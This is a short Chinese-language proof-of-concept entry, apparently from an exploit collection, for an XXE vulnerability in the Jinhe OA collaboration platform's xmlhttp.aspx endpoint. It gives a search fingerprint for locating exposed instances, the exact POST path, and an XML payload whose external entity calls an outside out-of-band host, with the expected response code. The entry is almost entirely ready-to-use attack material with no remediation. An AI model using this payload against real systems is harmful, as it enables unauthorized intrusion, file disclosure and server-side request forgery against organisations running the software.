# 金和OAJHSoft.Web.H5SiteControlxmlhttp.aspx存在XXE漏洞

金和OA ｜ XXE ｜ —
- **指纹**：`title="金和协同管理平台"`
- **请求**：`POST /c6/JHSoft.Web.H5SiteControl/xmlhttp.aspx/ HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```
- **响应特征**：200